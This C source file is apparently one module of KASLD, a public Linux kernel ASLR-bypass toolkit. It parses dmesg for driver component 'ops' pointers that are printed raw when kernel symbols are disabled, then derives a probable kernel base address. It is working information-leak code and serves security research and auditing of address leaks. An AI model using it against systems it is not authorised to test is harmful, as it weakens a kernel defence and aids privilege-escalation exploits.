// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for driver component ops pointers.
//
// The `component_bind` and `__component_add` functions print ops functions
// to the kernel log:
//
//   dev_dbg(master->parent, "binding %s (ops %ps)\n",
//   dev_info(master->parent, "bound %s (ops %ps)\n",
//   dev_err(master->parent, "failed to bind %s (ops %ps): %d\n",
//   dev_dbg(dev, "adding component (ops %ps)\n", ops);
//
// The "%ps" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
// - CONFIG_KALLSYMS=n
//
// References:
// https://elixir.bootlin.com/linux/v5.15.12/source/drivers/base/component.c
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *needle = " (ops 0x";

static int on_match(const char *line, void *ctx) {
  unsigned long *lowest = ctx;
  char *endptr;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);

  if (addr && addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    if (!*lowest || addr < *lowest)
      *lowest = addr;
  }

  return 1; /* keep scanning for lowest */
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for driver component ops pointers ...\n");
  dmesg_search(" (ops 0x", on_match, &addr);

  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               "dmesg_driver_component_ops");

  return 0;
}
